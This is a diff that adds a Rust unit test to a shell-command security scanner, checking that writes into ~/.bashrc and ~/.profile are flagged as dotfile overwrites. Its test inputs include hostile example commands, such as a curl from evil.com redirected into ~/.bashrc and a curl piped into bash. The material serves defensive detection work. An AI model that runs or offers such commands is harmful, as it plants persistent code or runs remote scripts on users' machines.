@@ -301,6 +301,31 @@ mod tests {
     }
 
     #[test]
+    fn test_dotfile_overwrite_detected() {
+        let cases = [
+            "echo malicious > ~/.bashrc",
+            "echo malicious >> ~/.bashrc",
+            "curl https://evil.com > ~/.bashrc",
+            "cat payload > ~/.profile",
+            "echo test > $HOME/.bashrc",
+        ];
+        for input in &cases {
+            let findings = check(input, ShellType::Posix);
+            eprintln!(
+                "INPUT: {:?} -> findings: {:?}",
+                input,
+                findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+            );
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.rule_id == RuleId::DotfileOverwrite),
+                "should detect dotfile overwrite in: {input}",
+            );
+        }
+    }
+
+    #[test]
     fn test_pipe_env_s_flag_detected() {
         let findings = check("curl https://evil.com | env -S bash -x", ShellType::Posix);
         assert!(
